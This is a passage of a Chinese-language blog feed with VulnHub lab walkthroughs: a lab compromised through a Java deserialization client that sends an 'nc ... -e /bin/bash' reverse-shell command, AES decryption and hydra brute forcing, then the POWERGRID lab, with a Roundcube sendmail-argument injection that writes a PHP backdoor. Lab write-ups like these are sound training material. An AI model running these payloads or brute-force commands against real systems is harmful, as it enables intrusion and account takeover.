&lt;h3 id=&#34;扫描靶机上开放的端口及详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描靶机上开放的端口及详细信息&#34;&gt;#&lt;/a&gt; 扫描靶机上开放的端口及详细信息&lt;/h3&gt;
&lt;p&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1433.png&#34; alt&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sV 表示扫描服务及版本信息&lt;/li&gt;
&lt;li&gt;sC 表示以默认的脚本进行扫描&lt;/li&gt;
&lt;li&gt;T 4 表示控制扫描的速度&lt;/li&gt;
&lt;li&gt;Pn 表示不用 ping 去扫描机器&lt;/li&gt;
&lt;li&gt;-open 表示只扫描开放的端口&lt;/li&gt;
&lt;li&gt;p- 表示扫描所有的端口&lt;/li&gt;
&lt;li&gt;-min-rate 设置最小的扫描速度&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;检索到的有效服务如下所示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检索到的有效服务如下所示&#34;&gt;#&lt;/a&gt; 检索到的有效服务如下所示：&lt;/h3&gt;
&lt;p&gt;21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 4444 krb 524 ：未知端口&lt;/p&gt;
&lt;h3 id=&#34;002-ftp匿名访问-jd-gui读jar文件sha-256-加密java解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-ftp匿名访问-jd-gui读jar文件sha-256-加密java解密&#34;&gt;#&lt;/a&gt; 002 ftp 匿名访问、jd-gui 读 jar 文件，SHA 256 加密，java 解密&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=&#34;&gt;ftp://192.168.0.186/&lt;/span&gt; 进行 ftp 信息收集&lt;br&gt;
有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1434.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来&lt;br&gt;
控制本地的目录&lt;/p&gt;
&lt;p&gt;note.txt 中提示 token 是 username 的 SHA 256 值&lt;br&gt;
并且有一个邮箱是 alienum@exogenesis，即用户为 alienum&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1435.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将下在后的 jar 文件，用 jd-gui 打开后查看源代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1436.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转&lt;br&gt;
变为字符串、get set 方法等&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1437.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Token 由 value 和 role 组成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1438.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1439.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识&lt;br&gt;
别不到 url 地址为 warzone.local&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1440.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1441.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来&lt;br&gt;
说就应该是 alienum 用户的 TOKEN 值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1442.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256&lt;br&gt;
echo -n “alienum” | shasum -a 256&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1443.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&lt;/p&gt;
&lt;p&gt;再次用 alienum 用户和他的 token 登陆发现爆了错误&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1444.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以&lt;br&gt;
绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA&lt;br&gt;
 其他的两个文件不变，主函数改为下面的代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1445.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;package alien;&lt;/p&gt;
&lt;p&gt;import java.io.IOException;&lt;br&gt;
import java.io.ObjectInputStream;&lt;br&gt;
import java.io.ObjectOutputStream;&lt;br&gt;
import java.net.Socket;&lt;/p&gt;
&lt;p&gt;public class Starter {&lt;br&gt;
static Socket socket = null;&lt;br&gt;
static ObjectOutputStream os;&lt;br&gt;
static Token token;&lt;/p&gt;
&lt;p&gt;public static void main(String[] args) throws IOException,&lt;br&gt;
ClassNotFoundException {&lt;br&gt;
socket = new Socket(“warzone.local”, 4444);&lt;br&gt;
os = new ObjectOutputStream(socket.getOutputStream());&lt;br&gt;
token = new&lt;br&gt;
Token(“6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec”,&lt;br&gt;
“astronaut”);&lt;/p&gt;
&lt;p&gt;RE list = new RE();&lt;br&gt;
list.setToken(token);&lt;br&gt;
list.setOption(“VIEW”);&lt;br&gt;
list.setValue(“VALUE”);&lt;br&gt;
list.setCmd(“nc 192.168.0.168 4444 -e /bin/bash”);&lt;/p&gt;
&lt;p&gt;os.writeObject(list);&lt;br&gt;
ObjectInputStream is = new ObjectInputStream(socket.getInputStream());&lt;br&gt;
RE response = (RE) is.readObject();&lt;br&gt;
os.close();&lt;br&gt;
socket.close();&lt;br&gt;
System.out.println(response.getValue());&lt;br&gt;
}&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;执行之后 shell 成功反弹，拿到了 exomorph 的权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1446.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;003-jar反编译java脚本解密aessshpass命令行连接靶机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-jar反编译java脚本解密aessshpass命令行连接靶机&#34;&gt;#&lt;/a&gt; 003 jar 反编译，java 脚本解密 AES，sshpass 命令行连接靶机&lt;/h3&gt;
&lt;p&gt;标准化 tty 就不多说了&lt;br&gt;
 script -qc /bin/bash/dev/null&lt;br&gt;
stty raw -echo;fg&lt;br&gt;
export TERM=xterm;reset;stty rows 64 columns 118&lt;br&gt;
 此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1447.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1448.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;CrypoException 是一个普通的类&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1449.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Cryptor 是一个 AES 加密文件，加密过程中会调用这个里边的方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1450.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Main 函数定义要加密的 key，以及加密后的文件的路径&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1451.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密&lt;br&gt;
先定义解密函数，通过如下方法来调用&lt;br&gt;
 public static void decrypt (String key, File inputFile, File outputFile) throws&lt;br&gt;
CryptoException {&lt;br&gt;
doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1452.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;再来修改主函数密钥维持不变修改当前的解密文件内容和解密后的文件保&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#再来修改主函数密钥维持不变修改当前的解密文件内容和解密后的文件保&#34;&gt;#&lt;/a&gt; 再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保&lt;/h3&gt;
&lt;h3 id=&#34;存路径并且调用解密方法最后将我们解密后的内容查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存路径并且调用解密方法最后将我们解密后的内容查看&#34;&gt;#&lt;/a&gt; 存路径，并且调用解密方法，最后将我们解密后的内容查看&lt;/h3&gt;
&lt;p&gt;package alienum;&lt;/p&gt;
&lt;p&gt;import java.io.File;&lt;br&gt;
import java.io.IOException;&lt;/p&gt;
&lt;p&gt;public class Main {&lt;br&gt;
static String inputPath =&lt;br&gt;
“/Users/chentuo/JavaProjects/alienum/aliens.encrypted”;&lt;/p&gt;
&lt;p&gt;static String outputPath = “/Users/chentuo/JavaProjects/alienum/aliens.txt”;&lt;/p&gt;
&lt;p&gt;public Main() {&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;public static void main(String[] args) throws IOException,&lt;br&gt;
ClassNotFoundException {&lt;br&gt;
String key = “w4rz0nerex0gener”;&lt;br&gt;
File inputFile = new File(inputPath);&lt;br&gt;
File decryptedFile = new File(outputPath);&lt;/p&gt;
&lt;p&gt;try {&lt;br&gt;
alienum.Cryptor.decrypt(key, inputFile, decryptedFile);&lt;br&gt;
} catch (CryptoException var5) {&lt;br&gt;
System.out.println(var5.getMessage());&lt;br&gt;
var5.printStackTrace();&lt;br&gt;
}&lt;/p&gt;
&lt;h3 id&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; }&lt;/h3&gt;
&lt;h3 id=&#34;-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#-2&#34;&gt;#&lt;/a&gt; }&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1453.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;运行此文件之后即可以在自己设置的目录下找到我们的解密文件但是这个解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运行此文件之后即可以在自己设置的目录下找到我们的解密文件但是这个解&#34;&gt;#&lt;/a&gt; 运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解&lt;/h3&gt;
&lt;p&gt;密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data&lt;br&gt;
 类型后，用 strings 查看得到了解密后的文件内容&lt;br&gt;
 minotaur:m1nom1no…&lt;br&gt;
scylla:scyscy…&lt;br&gt;
echidna:ech1ech1…&lt;/p&gt;
&lt;p&gt;cyclops:cyccyc…&lt;br&gt;
anunnaki:nak1nak1…&lt;br&gt;
anunnaki:nak1nak2…&lt;br&gt;
anunnaki:nakinaki…&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1454.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到了一串用户名和密码的组合，可能是 ssh 的用户和密码&lt;br&gt;
 cat aliens.txt | cut -d ‘:’ -f 1 &amp;gt; user.txt&lt;br&gt;
cat aliens.txt | cut -d ‘:’ -f 2 &amp;gt; pass.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1455.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;检查一下用户名和密码文件是否正确&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检查一下用户名和密码文件是否正确&#34;&gt;#&lt;/a&gt; 检查一下用户名和密码文件是否正确&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1456.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1457.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1458.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1459.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 ssh 成功连接到了靶机中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1460.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接&lt;br&gt;
 sshpass -p nak1nak1… ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmFudW5uYWtpQDE5Mi4xNjguMC4xODY=&#34;&gt;anunnaki@192.168.0.186&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1461.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-gpg解密文件java源码分析编写java解密代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-gpg解密文件java源码分析编写java解密代码&#34;&gt;#&lt;/a&gt; 004 gpg 解密文件，java 源码分析，编写 java 解密代码&lt;/h3&gt;
&lt;p&gt;检索服务器文件，看到提示文件与一个 gpg 的加密文件&lt;br&gt;
 info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1462.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;然而直接解密是可以弹出来输入密码的界面的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#然而直接解密是可以弹出来输入密码的界面的&#34;&gt;#&lt;/a&gt; 然而直接解密是可以弹出来输入密码的界面的，&lt;/h3&gt;
&lt;p&gt;输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1463.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;同样的下载到本地，用 jd-gui 打开，开始阅读源码&lt;br&gt;
 Cryptor.class 里边定义了一个加、解密方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1464.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Main.class 中设有盐值，并且在条件判断正确时为打印 passwd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1465.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Recources.class 里边是一些加密的字符串&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1466.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;编写 java 代码，进行解密，代码内容如下&lt;br&gt;
 import java.security.NoSuchAlgorithmException;&lt;br&gt;
import javax.crypto.BadPaddingException;&lt;br&gt;
import javax.crypto.IllegalBlockSizeException;&lt;br&gt;
import javax.crypto.NoSuchPaddingException;&lt;/p&gt;
&lt;p&gt;public class Main {&lt;br&gt;
public static void main(String[] args) throws NoSuchPaddingException,&lt;br&gt;
IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException {&lt;br&gt;
Cryptor cryptor = new Cryptor();&lt;/p&gt;
&lt;p&gt;String plaintext = cryptor.decrypt(cryptor.decrypt(“pr0tect1on1smust”,&lt;br&gt;
“/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=”),&lt;br&gt;
“jJ2Mrz4wjZDMSPwDr6TolQ==”);&lt;br&gt;
System.out.println(&amp;quot;[+] Success, the password is : &amp;quot; + plaintext);&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;h3 id=&#34;-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#-3&#34;&gt;#&lt;/a&gt; }&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1467.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;运行代码，成功解密出来了密码为 ufo_phosXEN&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1468.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;判断一下这个密码属于哪个用户，发现就是 root 用户的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1469.png&#34; alt&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-&amp;gt; 成功拿到了 root 权限&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/150%20POWERGRID/</guid>
            <title>VULNHUB 50 POWERGRID</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/150%20POWERGRID/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv&#34;&gt;https://www.vulnhub.com/entry/powergrid-101,485/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==&#34;&gt;https://blog.csdn.net/Jonah_Bare/article/details/106961477&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0=&#34;&gt;https://www.hackingarticles.in/powergrid-&lt;/span&gt; 1 - 0 - 1 - vulnhub-walkthrough/&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 POWERGRID：桥接于 1 92.168. 0 .1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1554.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1555.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1556.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;002-信息收集http-get爆破拿到后台权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-信息收集http-get爆破拿到后台权限&#34;&gt;#&lt;/a&gt; 002 信息收集，http-get 爆破，拿到后台权限&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu&#34;&gt;http://192.168.&lt;/span&gt; 0. 190 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1557.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;收集到了三个用户名 deez 1 、p 48 和 all 2&lt;/p&gt;
&lt;p&gt;用 common.txt 字典扫了一波，没有扫到有价值的信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1558.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;换了个字典扫了一波，扫到了一个 zmail 的目录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1559.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;访问之后得到了一个登陆页面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#访问之后得到了一个登陆页面&#34;&gt;#&lt;/a&gt; 访问之后得到了一个登陆页面&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=&#34;&gt;http://192.168.0.190/zmail&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1560.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;由于已经有了三个用户名了是有机会爆破得到密码的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#由于已经有了三个用户名了是有机会爆破得到密码的&#34;&gt;#&lt;/a&gt; 由于已经有了三个用户名了，是有机会爆破得到密码的&lt;/h3&gt;
&lt;p&gt;选择模式为 http-get，选取密码为 rockyou.txt 开始爆破&lt;br&gt;
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;t 64 -f -vV -o hydra.ssh&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1561.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;第一个用户爆破了-18-万次了还是没有爆破成功等的有点着急让这个继续爆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一个用户爆破了-18-万次了还是没有爆破成功等的有点着急让这个继续爆&#34;&gt;#&lt;/a&gt; 第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆&lt;/h3&gt;
&lt;p&gt;破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1562.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;f -vV -o hydra.ssh&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1563.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在爆破到 12 万次的时候，得到了 p 48 的密码 electrico&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1564.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;一个后台登陆地址，再次用 p 4 8:electrico 登陆到其中成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1565.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;登陆成功得到一个邮箱的后台界面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#登陆成功得到一个邮箱的后台界面&#34;&gt;#&lt;/a&gt; 登陆成功，得到一个邮箱的后台界面&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1566.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;003-roundcube邮件系统searchsploit利用antsword使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-roundcube邮件系统searchsploit利用antsword使用&#34;&gt;#&lt;/a&gt; 003 roundcube 邮件系统，searchsploit 利用，antsword 使用&lt;/h3&gt;
&lt;h3 id=&#34;有一封邮件看起来比较重要看一下什么意思&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有一封邮件看起来比较重要看一下什么意思&#34;&gt;#&lt;/a&gt; 有一封邮件，看起来比较重要，看一下什么意思&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1567.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1568.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1569.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;将此rce漏洞说明文件复制到本地开始阅读尝试测试能否突破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#将此rce漏洞说明文件复制到本地开始阅读尝试测试能否突破&#34;&gt;#&lt;/a&gt; 将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1570.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -&lt;br&gt;
X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1571.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在后台中开是发送邮件，并且把数据拦截到 burp&lt;br&gt;
 利用 burp 抓包，可以看到原始数据包有很多参数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1572.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致&lt;br&gt;
_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;amp;_task=mail&amp;amp;_action=send&amp;amp;_id=11315&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOjQ4ODAwNjJmNzBjNWE5MGUxNiZhbXA7X2F0dGFjaG1lbnRzPSZhbXA7X2Zyb209ZXhhbXBsZUBleGFtcGxlLmNvbQ==&#34;&gt;4880062f70c5a90e16&amp;amp;_attachments=&amp;amp;_from=example@example.com&lt;/span&gt; -&lt;br&gt;
OQueueDirectory=/tmp -&lt;br&gt;
X/var/www/html/rce.php&amp;amp;_to=sssssss%&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzQwcXEuY29t&#34;&gt;40qq.com&lt;/span&gt;&amp;amp;_cc=&amp;amp;_bcc=&amp;amp;_replyto=&amp;amp;_followupto=&lt;br&gt;
&amp;amp;_subject=&amp;lt;?php&lt;br&gt;
phpinfo();?&amp;gt;&amp;amp;editorSelector=plain&amp;amp;_priority=0&amp;amp;_store_target=Sent&amp;amp;_draft_saveid=&amp;amp;_draft&lt;br&gt;
=&amp;amp;_is_html=0&amp;amp;_framed=1&amp;amp;_message=aaa&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1573.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我&lt;br&gt;
们已经成功的上传上去了一个后门&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1574.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;其他没有任何信息的页面应该是如下内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他没有任何信息的页面应该是如下内容&#34;&gt;#&lt;/a&gt; 其他没有任何信息的页面应该是如下内容&lt;/h3&gt;
